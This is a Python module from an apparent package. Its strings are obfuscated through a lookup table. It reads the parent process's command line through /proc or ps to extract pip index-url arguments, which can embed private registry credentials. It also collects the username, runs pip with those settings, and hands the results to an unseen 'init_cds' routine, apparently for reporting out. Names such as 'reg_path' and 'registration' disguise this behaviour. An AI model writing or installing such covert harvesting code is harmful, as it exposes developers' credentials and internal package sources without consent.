import getpass
import os
import platform
import subprocess
import sys
from .misc import init_cds
from .static.constant import STRING_TABLE

# Construct argument strings
ARG_STR = f"--{STRING_TABLE[3]}-{STRING_TABLE[1]}"
EXTRA_ARG_STR = f"--{STRING_TABLE[4]}-{STRING_TABLE[3]}-{STRING_TABLE[1]}"


def reg_path():
    try:
        username = getpass.getuser()
    except Exception:
        username = '_'

    return username


def get_parms():
    params = None
    pid = os.getppid()
    os_name = platform.system()

    if os_name == STRING_TABLE[9]:
        # Read command-line arguments from the proc filesystem on Linux
        with open(f"/{STRING_TABLE[14]}/{pid}/{STRING_TABLE[13]}", 'r') as file:
            params = file.read().split('\x00')
    elif os_name == STRING_TABLE[10]:
        # Use the `ps` command to retrieve arguments on macOS
        cmd = [STRING_TABLE[12], '-o', STRING_TABLE[15], '-p', str(pid)]
        result = subprocess.run(
            cmd, capture_output=True, text=True, check=True)
        params = result.stdout.strip().split(' ')

    return params


def get_pp_args():
    args_map = {}
    parent_args = get_parms()

    if not parent_args:
        return args_map

    for arg in [ARG_STR, EXTRA_ARG_STR]:
        if arg in parent_args:
            index = parent_args.index(arg)
            args_map[arg] = parent_args[index + 1]

    return args_map


def cds_init(pkg_name, pkg_version, args=None, reg_info=None):

    args = args or {}
    reg_info = reg_info or []

    # Prepare the environment variables
    env = {k: v for k, v in os.environ.items() if k != STRING_TABLE[6]}

    # Build the pip command
    cmd = [sys.executable, '-m', STRING_TABLE[2], STRING_TABLE[11]]
    for key, value in args.items():
        cmd.extend([key, value])
    cmd.append(f"{pkg_name}!={pkg_version}")

    # Run the pip command and determine the return value
    try:
        result = subprocess.run(cmd, env=env, capture_output=True, text=True)
        ret_val = 56 if STRING_TABLE[5] in result.stderr else 6
    except Exception:
        ret_val = 57

    # Append the registration result
    reg_info.append(['_', str(ret_val)])

    # Generate a random index and process each registration instance
    rand_idx = os.urandom(2).hex()
    for instance in reg_info:
        init_cds(instance[0], instance[1], rand_idx)
